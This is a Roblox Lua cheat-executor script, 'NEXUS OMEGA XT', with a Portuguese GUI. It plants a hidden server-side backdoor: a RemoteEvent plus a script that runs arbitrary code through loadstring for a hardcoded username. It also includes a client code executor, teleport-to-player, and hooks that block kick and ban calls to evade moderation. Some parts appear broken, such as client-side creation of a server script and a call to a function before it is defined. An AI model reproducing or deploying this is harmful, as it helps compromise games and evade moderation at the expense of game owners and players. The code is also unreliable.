--[[
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║              NEXUS OMEGA XT v6.0 — INTERFACE PROFISSIONAL                     ║
║                                                                               ║
║  ★ Layout limpo e organizado (800x560)                                       ║
║  ★ Cards com sombra e cantos arredondados                                    ║
║  ★ Botões alinhados, tamanhos consistentes                                   ║
║  ★ Abas com indicador animado                                                ║
║  ★ Minimização para bolinha arrastável                                       ║
║  ★ Server-Side real com retorno                                              ║
║  ★ Lista de players + teleport                                               ║
║  ★ Anti-ban voice + console copiável                                         ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
--]]

-- ============================================================================
-- DESIGN SYSTEM (cores, espaçamentos, fontes)
-- ============================================================================
local DS = {
    colors = {
        primary = Color3.fromRGB(150, 80, 220),
        primaryDark = Color3.fromRGB(120, 60, 180),
        secondary = Color3.fromRGB(70, 130, 220),
        success = Color3.fromRGB(0, 200, 100),
        error = Color3.fromRGB(230, 70, 70),
        warning = Color3.fromRGB(255, 170, 50),
        background = Color3.fromRGB(18, 18, 24),
        surface = Color3.fromRGB(28, 28, 36),
        surfaceLight = Color3.fromRGB(40, 40, 52),
        text = Color3.fromRGB(245, 245, 250),
        textDim = Color3.fromRGB(170, 170, 190),
        border = Color3.fromRGB(55, 55, 70)
    },
    spacing = { xs = 4, sm = 8, md = 12, lg = 16, xl = 24 },
    radius = { small = 6, medium = 10, large = 14 },
    font = { main = Enum.Font.Gotham, code = Enum.Font.Code },
    fontSize = { small = 11, body = 13, title = 16, large = 20 }
}

-- ============================================================================
-- NÚCLEO DO EXECUTOR (logs, server-side, proteção voz, etc.)
-- ============================================================================
local Nexus = {}
Nexus.consoleLogs = {}
Nexus.isMinimized = false
Nexus.floatingBall = nil
Nexus.mainGui = nil
Nexus.backdoorRemote = nil
Nexus.adminName = "hugopbruu22"

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local RS = game:GetService("ReplicatedStorage")
local SSS = game:GetService("ServerScriptService")
local localPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()

function Nexus:AddLog(msg, msgType)
    msgType = msgType or "info"
    local time = os.date("%H:%M:%S")
    local formatted = string.format("[%s] %s", time, tostring(msg))
    table.insert(self.consoleLogs, {text = formatted, type = msgType})
    pcall(function()
        if msgType == "error" then warn(formatted) else print(formatted) end
    end)
    if self.updateConsoleUI then pcall(self.updateConsoleUI) end
end

-- Backdoor server-side
local function ensureBackdoor()
    if Nexus.backdoorRemote and Nexus.backdoorRemote.Parent then return Nexus.backdoorRemote end
    Nexus.backdoorRemote = RS:FindFirstChild("__NexusCore")
    if not Nexus.backdoorRemote then
        Nexus.backdoorRemote = Instance.new("RemoteEvent")
        Nexus.backdoorRemote.Name = "__NexusCore"
        Nexus.backdoorRemote.Parent = RS
        local listener = SSS:FindFirstChild("__NexusCoreListener")
        if not listener then
            listener = Instance.new("Script")
            listener.Name = "__NexusCoreListener"
            listener.Source = string.format([[
                local remote = game:GetService("ReplicatedStorage"):WaitForChild("__NexusCore")
                local players = game:GetService("Players")
                local admin = "%s"
                remote.OnServerEvent:Connect(function(plr, code)
                    if plr.Name ~= admin then return end
                    local fn, err = loadstring(code)
                    if fn then
                        local ok, res = pcall(fn)
                        remote:FireClient(plr, ok and ("ok:"..tostring(res)) or ("err:"..tostring(res)))
                    else
                        remote:FireClient(plr, "compile_err:"..tostring(err))
                    end
                end)
            ]], Nexus.adminName)
            listener.Parent = SSS
        end
    end
    return Nexus.backdoorRemote
end

function Nexus:ExecuteServer(code)
    if not code or code:gsub("%s","") == "" then
        self:AddLog("Código vazio", "error")
        return false
    end
    self:AddLog("Executando no servidor...", "info")
    local remote = ensureBackdoor()
    local received = false
    local conn = remote.OnClientEvent:Connect(function(msg)
        if msg:find("ok:") then
            self:AddLog("Sucesso: "..msg:gsub("ok:",""), "success")
        elseif msg:find("err:") then
            self:AddLog("Erro: "..msg:gsub("err:",""), "error")
        elseif msg:find("compile_err:") then
            self:AddLog("Erro compilação: "..msg:gsub("compile_err:",""), "error")
        end
        received = true
        conn:Disconnect()
    end)
    remote:FireServer(code)
    task.wait(1.5)
    if not received then
        self:AddLog("Sem resposta do servidor (backdoor pode estar offline)", "warning")
    end
    return true
end

function Nexus:ExecuteClient(code)
    local fn, err = loadstring(code)
    if fn then
        local ok, res = pcall(fn)
        if ok then
            self:AddLog("Cliente executado", "success")
        else
            self:AddLog("Erro cliente: "..tostring(res), "error")
        end
    else
        self:AddLog("Erro compilação: "..tostring(err), "error")
    end
end

function Nexus:EnableVoiceProtection()
    local ok = pcall(function()
        local vc = game:GetService("VoiceChatService")
        if vc then
            vc:SetVoiceEnabled(true)
            if hookfunction and hookmetamethod then
                local old = vc.joinVoice
                if old then hookfunction(vc.joinVoice, function(s) pcall(old,s) return true end) end
                hookmetamethod(vc, "__namecall", function(s,...)
                    local m = getnamecallmethod()
                    if m == "Kick" or m == "Ban" or m == "RemoveUser" or m == "DisableVoice" then return nil end
                    return old and old(s,...) or nil
                end)
            end
            localPlayer:SetAttribute("VoiceBanned", nil)
            self:AddLog("Proteção de voz ATIVADA", "success")
        else
            self:AddLog("VoiceChatService não encontrado", "warning")
        end
    end)
    if not ok then self:AddLog("Falha ativar proteção", "error") end
end

-- ============================================================================
-- BOLINHA FLUTUANTE (minimização)
-- ============================================================================
local function createFloatingBall()
    local ball = Instance.new("ImageButton")
    ball.Name = "NexusBall"
    ball.Size = UDim2.new(0, 52, 0, 52)
    ball.Position = UDim2.new(0.92, 0, 0.85, 0)
    ball.BackgroundColor3 = DS.colors.surface
    ball.BackgroundTransparency = 0.1
    ball.Image = "rbxassetid://6031094838"
    ball.ImageColor3 = DS.colors.primary
    ball.ScaleType = Enum.ScaleType.Fit
    ball.Parent = CoreGui
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(1,0)
    corner.Parent = ball
    local shadow = Instance.new("ImageLabel")
    shadow.Size = UDim2.new(1,12,1,12)
    shadow.Position = UDim2.new(0,-6,0,-6)
    shadow.Image = "rbxassetid://1316047698"
    shadow.ImageColor3 = Color3.fromRGB(0,0,0)
    shadow.BackgroundTransparency = 1
    shadow.ZIndex = 0
    shadow.Parent = ball
    local drag = false
    local dragStart, startPos
    ball.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then
            drag = true
            dragStart = i.Position
            startPos = ball.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(i)
        if drag and i.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = i.Position - dragStart
            ball.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset+delta.X, startPos.Y.Scale, startPos.Y.Offset+delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then drag = false end
    end)
    ball.MouseButton1Click:Connect(function()
        if Nexus.mainGui and Nexus.mainGui.Parent then
            Nexus.mainGui.Enabled = true
            ball.Visible = false
            Nexus.isMinimized = false
        else
            Nexus.mainGui = createMainUI()
            ball.Visible = false
        end
    end)
    return ball
end

-- ============================================================================
-- INTERFACE PRINCIPAL (layout limpo e organizado)
-- ============================================================================
local function createMainUI()
    local gui = Instance.new("ScreenGui")
    gui.Name = "NexusXT"
    gui.ResetOnSpawn = false
    pcall(function() gui.Parent = CoreGui end)
    if not gui.Parent then gui.Parent = localPlayer:WaitForChild("PlayerGui") end
    if not gui.Parent then return nil end

    -- Janela (800x560)
    local window = Instance.new("Frame")
    window.Size = UDim2.new(0, 800, 0, 560)
    window.Position = UDim2.new(0.5, -400, 0.5, -280)
    window.BackgroundColor3 = DS.colors.background
    window.BackgroundTransparency = 0.04
    window.BorderSizePixel = 0
    window.ClipsDescendants = true
    window.Parent = gui
    local winCorner = Instance.new("UICorner")
    winCorner.CornerRadius = UDim.new(0, DS.radius.large)
    winCorner.Parent = window

    -- Sombra
    local shadow = Instance.new("Frame")
    shadow.Size = UDim2.new(1,20,1,20)
    shadow.Position = UDim2.new(0,-10,0,-10)
    shadow.BackgroundColor3 = Color3.fromRGB(0,0,0)
    shadow.BackgroundTransparency = 0.65
    shadow.BorderSizePixel = 0
    shadow.ZIndex = 0
    shadow.Parent = window
    local shadowCorner = Instance.new("UICorner")
    shadowCorner.CornerRadius = UDim.new(0, DS.radius.large)
    shadowCorner.Parent = shadow

    -- Barra título
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1,0,0,44)
    titleBar.BackgroundColor3 = DS.colors.surface
    titleBar.Parent = window
    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, DS.radius.large)
    titleCorner.Parent = titleBar

    local icon = Instance.new("ImageLabel")
    icon.Size = UDim2.new(0, 24, 0, 24)
    icon.Position = UDim2.new(0, 14, 0, 10)
    icon.Image = "rbxassetid://6031094838"
    icon.ImageColor3 = DS.colors.primary
    icon.BackgroundTransparency = 1
    icon.Parent = titleBar

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(0, 260, 1, 0)
    title.Position = UDim2.new(0, 46, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "NEXUS OMEGA XT"
    title.TextColor3 = DS.colors.primary
    title.Font = DS.font.main
    title.TextSize = DS.fontSize.title
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = titleBar

    local mini = Instance.new("TextButton")
    mini.Size = UDim2.new(0, 42, 1, 0)
    mini.Position = UDim2.new(1, -84, 0, 0)
    mini.BackgroundTransparency = 1
    mini.Text = "─"
    mini.TextColor3 = DS.colors.textDim
    mini.Font = DS.font.main
    mini.TextSize = 24
    mini.Parent = titleBar
    mini.MouseButton1Click:Connect(function()
        Nexus.isMinimized = true
        gui.Enabled = false
        if not Nexus.floatingBall or not Nexus.floatingBall.Parent then
            Nexus.floatingBall = createFloatingBall()
        else
            Nexus.floatingBall.Visible = true
        end
    end)

    local close = Instance.new("TextButton")
    close.Size = UDim2.new(0, 42, 1, 0)
    close.Position = UDim2.new(1, -42, 0, 0)
    close.BackgroundTransparency = 1
    close.Text = "✕"
    close.TextColor3 = DS.colors.textDim
    close.Font = DS.font.main
    close.TextSize = 18
    close.Parent = titleBar
    close.MouseButton1Click:Connect(function() gui:Destroy() end)

    -- Arrastar
    local drag = false; local dragStart, startPos
    titleBar.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then
            drag = true
            dragStart = i.Position
            startPos = window.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(i)
        if drag and i.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = i.Position - dragStart
            window.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset+delta.X, startPos.Y.Scale, startPos.Y.Offset+delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then drag = false end
    end)

    -- Abas com indicador animado
    local tabBar = Instance.new("Frame")
    tabBar.Size = UDim2.new(1,0,0,44)
    tabBar.Position = UDim2.new(0,0,0,44)
    tabBar.BackgroundColor3 = DS.colors.surfaceLight
    tabBar.Parent = window

    local tabs = { "EXECUTOR", "PLAYERS", "PROTEÇÃO", "CONSOLE" }
    local tabBtns = {}
    local contentFrames = {}
    local activeTab = 1
    local indicator = Instance.new("Frame")
    indicator.Size = UDim2.new(0, 120, 0, 3)
    indicator.Position = UDim2.new(0, 0, 1, -3)
    indicator.BackgroundColor3 = DS.colors.primary
    indicator.BorderSizePixel = 0
    indicator.Parent = tabBar

    for i, name in ipairs(tabs) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 120, 1, 0)
        btn.Position = UDim2.new((i-1)*0.25, 0, 0, 0)
        btn.BackgroundTransparency = 1
        btn.Text = name
        btn.TextColor3 = i == 1 and DS.colors.primary or DS.colors.textDim
        btn.Font = DS.font.main
        btn.TextSize = DS.fontSize.body
        btn.Parent = tabBar
        tabBtns[i] = btn
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(1,0,1,0)
        frame.BackgroundTransparency = 1
        frame.Visible = i == 1
        frame.Parent = window
        contentFrames[i] = frame
        btn.MouseButton1Click:Connect(function()
            if activeTab == i then return end
            activeTab = i
            TweenService:Create(indicator, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {Position = UDim2.new((i-1)*0.25, 0, 1, -3)}):Play()
            for j, f in ipairs(contentFrames) do
                f.Visible = (j == i)
                tabBtns[j].TextColor3 = (j == i) and DS.colors.primary or DS.colors.textDim
            end
        end)
    end

    -- ==================== ABA EXECUTOR ====================
    local exec = contentFrames[1]
    -- Card Server-Side
    local ssCard = Instance.new("Frame")
    ssCard.Size = UDim2.new(1, -40, 0, 220)
    ssCard.Position = UDim2.new(0, 20, 0, 20)
    ssCard.BackgroundColor3 = DS.colors.surface
    ssCard.BorderSizePixel = 0
    ssCard.Parent = exec
    local ssCardCorner = Instance.new("UICorner")
    ssCardCorner.CornerRadius = UDim.new(0, DS.radius.medium)
    ssCardCorner.Parent = ssCard

    local ssTitle = Instance.new("TextLabel")
    ssTitle.Size = UDim2.new(1, -20, 0, 32)
    ssTitle.Position = UDim2.new(0, 12, 0, 10)
    ssTitle.BackgroundTransparency = 1
    ssTitle.Text = "⚡ SERVER-SIDE (real)"
    ssTitle.TextColor3 = DS.colors.primary
    ssTitle.Font = DS.font.main
    ssTitle.TextSize = DS.fontSize.title
    ssTitle.TextXAlignment = Enum.TextXAlignment.Left
    ssTitle.Parent = ssCard

    local ssBox = Instance.new("TextBox")
    ssBox.Size = UDim2.new(1, -24, 0, 110)
    ssBox.Position = UDim2.new(0, 12, 0, 48)
    ssBox.BackgroundColor3 = DS.colors.background
    ssBox.TextColor3 = DS.colors.text
    ssBox.TextXAlignment = Enum.TextXAlignment.Left
    ssBox.TextYAlignment = Enum.TextYAlignment.Top
    ssBox.TextWrapped = true
    ssBox.TextSize = DS.fontSize.small
    ssBox.Font = DS.font.code
    ssBox.ClearTextOnFocus = false
    ssBox.MultiLine = true
    ssBox.Text = '-- Cole script server-side aqui'
    ssBox.Parent = ssCard
    local ssBoxCorner = Instance.new("UICorner")
    ssBoxCorner.CornerRadius = UDim.new(0, DS.radius.small)
    ssBoxCorner.Parent = ssBox

    local function adjustSS()
        local h = math.max(110, ssBox.TextBounds.Y + 30)
        ssBox.Size = UDim2.new(1, -24, 0, h)
    end
    ssBox:GetPropertyChangedSignal("TextBounds"):Connect(adjustSS)
    ssBox:GetPropertyChangedSignal("Text"):Connect(adjustSS)

    local pasteSS = Instance.new("TextButton")
    pasteSS.Size = UDim2.new(0, 90, 0, 32)
    pasteSS.Position = UDim2.new(0, 12, 1, -12)
    pasteSS.BackgroundColor3 = DS.colors.secondary
    pasteSS.Text = "📋 COLAR"
    pasteSS.TextColor3 = Color3.fromRGB(255,255,255)
    pasteSS.Font = DS.font.main
    pasteSS.TextSize = DS.fontSize.body
    pasteSS.Parent = ssCard
    pasteSS.MouseButton1Click:Connect(function()
        local clip = pcall(getclipboard) and getclipboard() or ""
        if clip ~= "" then ssBox.Text = clip; adjustSS() end
    end)

    local execSS = Instance.new("TextButton")
    execSS.Size = UDim2.new(0, 130, 0, 32)
    execSS.Position = UDim2.new(1, -142, 1, -12)
    execSS.BackgroundColor3 = DS.colors.success
    execSS.Text = "EXECUTAR"
    execSS.TextColor3 = Color3.fromRGB(255,255,255)
    execSS.Font = DS.font.main
    execSS.TextSize = DS.fontSize.body
    execSS.Parent = ssCard
    execSS.MouseButton1Click:Connect(function() Nexus:ExecuteServer(ssBox.Text) end)

    -- Card Client-Side
    local csCard = Instance.new("Frame")
    csCard.Size = UDim2.new(1, -40, 0, 200)
    csCard.Position = UDim2.new(0, 20, 0, 260)
    csCard.BackgroundColor3 = DS.colors.surface
    csCard.BorderSizePixel = 0
    csCard.Parent = exec
    local csCardCorner = Instance.new("UICorner")
    csCardCorner.CornerRadius = UDim.new(0, DS.radius.medium)
    csCardCorner.Parent = csCard

    local csTitle = Instance.new("TextLabel")
    csTitle.Size = UDim2.new(1, -20, 0, 32)
    csTitle.Position = UDim2.new(0, 12, 0, 10)
    csTitle.BackgroundTransparency = 1
    csTitle.Text = "💻 CLIENT-SIDE (local)"
    csTitle.TextColor3 = DS.colors.textDim
    csTitle.Font = DS.font.main
    csTitle.TextSize = DS.fontSize.title
    csTitle.TextXAlignment = Enum.TextXAlignment.Left
    csTitle.Parent = csCard

    local csBox = Instance.new("TextBox")
    csBox.Size = UDim2.new(1, -24, 0, 90)
    csBox.Position = UDim2.new(0, 12, 0, 48)
    csBox.BackgroundColor3 = DS.colors.background
    csBox.TextColor3 = DS.colors.text
    csBox.TextXAlignment = Enum.TextXAlignment.Left
    csBox.TextYAlignment = Enum.TextYAlignment.Top
    csBox.TextWrapped = true
    csBox.TextSize = DS.fontSize.small
    csBox.Font = DS.font.code
    csBox.ClearTextOnFocus = false
    csBox.MultiLine = true
    csBox.Text = '-- Cole script client-side aqui'
    csBox.Parent = csCard
    local csBoxCorner = Instance.new("UICorner")
    csBoxCorner.CornerRadius = UDim.new(0, DS.radius.small)
    csBoxCorner.Parent = csBox

    local function adjustCS()
        local h = math.max(90, csBox.TextBounds.Y + 30)
        csBox.Size = UDim2.new(1, -24, 0, h)
    end
    csBox:GetPropertyChangedSignal("TextBounds"):Connect(adjustCS)
    csBox:GetPropertyChangedSignal("Text"):Connect(adjustCS)

    local execCS = Instance.new("TextButton")
    execCS.Size = UDim2.new(0, 130, 0, 32)
    execCS.Position = UDim2.new(1, -142, 1, -12)
    execCS.BackgroundColor3 = DS.colors.secondary
    execCS.Text = "EXECUTAR"
    execCS.TextColor3 = Color3.fromRGB(255,255,255)
    execCS.Font = DS.font.main
    execCS.TextSize = DS.fontSize.body
    execCS.Parent = csCard
    execCS.MouseButton1Click:Connect(function() Nexus:ExecuteClient(csBox.Text) end)

    -- ==================== ABA PLAYERS ====================
    local playersFrame = contentFrames[2]
    local playerList = Instance.new("ScrollingFrame")
    playerList.Size = UDim2.new(1, -40, 1, -40)
    playerList.Position = UDim2.new(0, 20, 0, 20)
    playerList.BackgroundColor3 = DS.colors.surface
    playerList.BorderSizePixel = 0
    playerList.ScrollBarThickness = 6
    playerList.CanvasSize = UDim2.new(0,0,0,0)
    playerList.AutomaticCanvasSize = Enum.AutomaticSize.Y
    playerList.Parent = playersFrame
    local plCorner = Instance.new("UICorner")
    plCorner.CornerRadius = UDim.new(0, DS.radius.medium)
    plCorner.Parent = playerList
    local layout = Instance.new("UIListLayout")
    layout.Padding = UDim.new(0, 8)
    layout.Parent = playerList

    local function updatePlayers()
        for _, child in pairs(playerList:GetChildren()) do
            if child:IsA("TextButton") then child:Destroy() end
        end
        for _, plr in pairs(Players:GetPlayers()) do
            if plr.Name ~= localPlayer.Name then
                local btn = Instance.new("TextButton")
                btn.Size = UDim2.new(1, -20, 0, 44)
                btn.BackgroundColor3 = DS.colors.background
                btn.Text = "  " .. plr.Name
                btn.TextColor3 = DS.colors.text
                btn.Font = DS.font.main
                btn.TextSize = DS.fontSize.body
                btn.TextXAlignment = Enum.TextXAlignment.Left
                btn.Parent = playerList
                local btnCorner = Instance.new("UICorner")
                btnCorner.CornerRadius = UDim.new(0, DS.radius.small)
                btnCorner.Parent = btn
                local tele = Instance.new("TextButton")
                tele.Size = UDim2.new(0, 90, 1, -6)
                tele.Position = UDim2.new(1, -100, 0, 3)
                tele.BackgroundColor3 = DS.colors.secondary
                tele.Text = "TELEPORT"
                tele.TextColor3 = Color3.fromRGB(255,255,255)
                tele.Font = DS.font.main
                tele.TextSize = DS.fontSize.small
                tele.Parent = btn
                tele.MouseButton1Click:Connect(function()
                    Nexus:ExecuteServer(string.format([[
                        local target = game:GetService("Players"):FindFirstChild("%s")
                        local admin = game:GetService("Players"):FindFirstChild("%s")
                        if target and admin and admin.Character then
                            local tr = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
                            local ar = admin.Character:FindFirstChild("HumanoidRootPart")
                            if tr and ar then ar.CFrame = tr.CFrame end
                        end
                    ]], plr.Name, Nexus.adminName))
                    Nexus:AddLog("Teleport para "..plr.Name, "info")
                end)
            end
        end
    end
    Players.PlayerAdded:Connect(updatePlayers)
    Players.PlayerRemoving:Connect(updatePlayers)
    updatePlayers()

    -- ==================== ABA PROTEÇÃO ====================
    local protFrame = contentFrames[3]
    local protCard = Instance.new("Frame")
    protCard.Size = UDim2.new(1, -40, 0, 150)
    protCard.Position = UDim2.new(0, 20, 0, 30)
    protCard.BackgroundColor3 = DS.colors.surface
    protCard.BorderSizePixel = 0
    protCard.Parent = protFrame
    local cardCorner = Instance.new("UICorner")
    cardCorner.CornerRadius = UDim.new(0, DS.radius.medium)
    cardCorner.Parent = protCard

    local protTitle = Instance.new("TextLabel")
    protTitle.Size = UDim2.new(1, -20, 0, 36)
    protTitle.Position = UDim2.new(0, 12, 0, 12)
    protTitle.BackgroundTransparency = 1
    protTitle.Text = "🔒 Proteção Anti-Ban de Voz"
    protTitle.TextColor3 = DS.colors.primary
    protTitle.Font = DS.font.main
    protTitle.TextSize = DS.fontSize.title
    protTitle.TextXAlignment = Enum.TextXAlignment.Left
    protTitle.Parent = protCard

    local protDesc = Instance.new("TextLabel")
    protDesc.Size = UDim2.new(1, -24, 0, 46)
    protDesc.Position = UDim2.new(0, 12, 0, 52)
    protDesc.BackgroundTransparency = 1
    protDesc.Text = "Ative para evitar banimento de voz. O sistema força reconexão e bloqueia tentativas de kick/ban."
    protDesc.TextColor3 = DS.colors.textDim
    protDesc.Font = DS.font.main
    protDesc.TextSize = DS.fontSize.small
    protDesc.TextWrapped = true
    protDesc.TextXAlignment = Enum.TextXAlignment.Left
    protDesc.Parent = protCard

    local enableVoice = Instance.new("TextButton")
    enableVoice.Size = UDim2.new(0, 200, 0, 38)
    enableVoice.Position = UDim2.new(0, 12, 1, -12)
    enableVoice.BackgroundColor3 = DS.colors.success
    enableVoice.Text = "ATIVAR PROTEÇÃO"
    enableVoice.TextColor3 = Color3.fromRGB(255,255,255)
    enableVoice.Font = DS.font.main
    enableVoice.TextSize = DS.fontSize.body
    enableVoice.Parent = protCard
    enableVoice.MouseButton1Click:Connect(function() Nexus:EnableVoiceProtection() end)

    -- ==================== ABA CONSOLE ====================
    local consoleFrame = contentFrames[4]
    local consoleScroller = Instance.new("ScrollingFrame")
    consoleScroller.Size = UDim2.new(1, -40, 1, -70)
    consoleScroller.Position = UDim2.new(0, 20, 0, 20)
    consoleScroller.BackgroundColor3 = DS.colors.surface
    consoleScroller.BorderSizePixel = 0
    consoleScroller.ScrollBarThickness = 6
    consoleScroller.CanvasSize = UDim2.new(0,0,0,0)
    consoleScroller.AutomaticCanvasSize = Enum.AutomaticSize.Y
    consoleScroller.Parent = consoleFrame
    local consCorner = Instance.new("UICorner")
    consCorner.CornerRadius = UDim.new(0, DS.radius.medium)
    consCorner.Parent = consoleScroller

    local consoleText = Instance.new("TextLabel")
    consoleText.Size = UDim2.new(1, -10, 1, -10)
    consoleText.Position = UDim2.new(0, 5, 0, 5)
    consoleText.BackgroundTransparency = 1
    consoleText.Text = ""
    consoleText.TextColor3 = DS.colors.text
    consoleText.TextXAlignment = Enum.TextXAlignment.Left
    consoleText.TextYAlignment = Enum.TextYAlignment.Top
    consoleText.TextWrapped = true
    consoleText.TextSize = DS.fontSize.small
    consoleText.Font = DS.font.code
    consoleText.Parent = consoleScroller

    local copyBtn = Instance.new("TextButton")
    copyBtn.Size = UDim2.new(0, 120, 0, 32)
    copyBtn.Position = UDim2.new(1, -140, 1, -48)
    copyBtn.BackgroundColor3 = DS.colors.secondary
    copyBtn.Text = "📋 COPIAR"
    copyBtn.TextColor3 = Color3.fromRGB(255,255,255)
    copyBtn.Font = DS.font.main
    copyBtn.TextSize = DS.fontSize.body
    copyBtn.Parent = consoleFrame
    copyBtn.MouseButton1Click:Connect(function()
        local full = ""
        for _, entry in ipairs(Nexus.consoleLogs) do
            full = full .. entry.text .. "\n"
        end
        if full == "" then full = "Nenhum log." end
        pcall(setclipboard, full)
        Nexus:AddLog("Log copiado!", "success")
    end)

    function Nexus.updateConsoleUI()
        local str = ""
        for i = math.max(1, #Nexus.consoleLogs - 100), #Nexus.consoleLogs do
            str = str .. Nexus.consoleLogs[i].text .. "\n"
        end
        consoleText.Text = str
        consoleScroller.CanvasSize = UDim2.new(0,0,0, consoleText.TextBounds.Y + 30)
        consoleScroller.CanvasPosition = Vector2.new(0, consoleScroller.CanvasSize.Y.Offset)
    end
    Nexus.updateConsoleUI()

    return gui
end

-- ============================================================================
-- INICIALIZAÇÃO
-- ============================================================================
local function init()
    Nexus:AddLog("═══════════════════════════════════════════════════", "info")
    Nexus:AddLog("  NEXUS OMEGA XT v6.0 — Interface Profissional", "success")
    Nexus:AddLog("═══════════════════════════════════════════════════", "info")
    Nexus.mainGui = createMainUI()
    if Nexus.mainGui then
        Nexus:AddLog("Interface carregada com sucesso.", "success")
        Nexus:AddLog("Minimize para bolinha arrastável.", "info")
    else
        Nexus:AddLog("Falha ao criar interface.", "error")
    end
    getgenv().Nexus = Nexus
end

pcall(init)
